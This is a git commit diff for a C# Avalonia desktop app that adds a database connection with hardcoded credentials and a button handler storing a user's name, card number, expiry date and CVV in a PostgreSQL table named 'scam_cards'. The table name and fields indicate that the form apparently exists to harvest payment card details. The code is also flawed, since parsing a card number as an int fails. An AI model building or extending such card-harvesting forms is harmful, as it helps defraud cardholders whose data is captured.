1f7ea24014b117be2257855e8e586c8d19a6687e
San4eeez <AlexandroHell@yandex.ru>
2023-11-14 16:38:16 +0300

    cards

--- Forma/MainWindow.axaml.cs
+++ Forma/MainWindow.axaml.cs
@@ -1,16 +1,31 @@
 using Avalonia.Controls;
+using Npgsql;
+
+
 
 namespace Forma
 {
     public partial class MainWindow : Window
     {
+        NpgsqlDataSource dataSource;
         public MainWindow()
         {
+            var connectionString = "Host=localhost;Username=postgres;Password=admin;Database=forma";
+            dataSource = NpgsqlDataSource.Create(connectionString);
             InitializeComponent();
         }
 
         private void Button_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
         {
+            using (var cmd = dataSource.CreateCommand("INSERT INTO scam_cards (fio, number,mounth,year,cvv) VALUES ($1, $2, $3, $4, $5)"))
+            {
+                cmd.Parameters.AddWithValue(Fio.Text);
+                cmd.Parameters.AddWithValue(int.Parse(Number.Text));
+                cmd.Parameters.AddWithValue(int.Parse(Mounth.Text));
+                cmd.Parameters.AddWithValue(int.Parse(Year.Text));
+                cmd.Parameters.AddWithValue(int.Parse(Cvv.Text));
+                cmd.ExecuteNonQuery();
+            }
             new Window1().Show();
         }
 
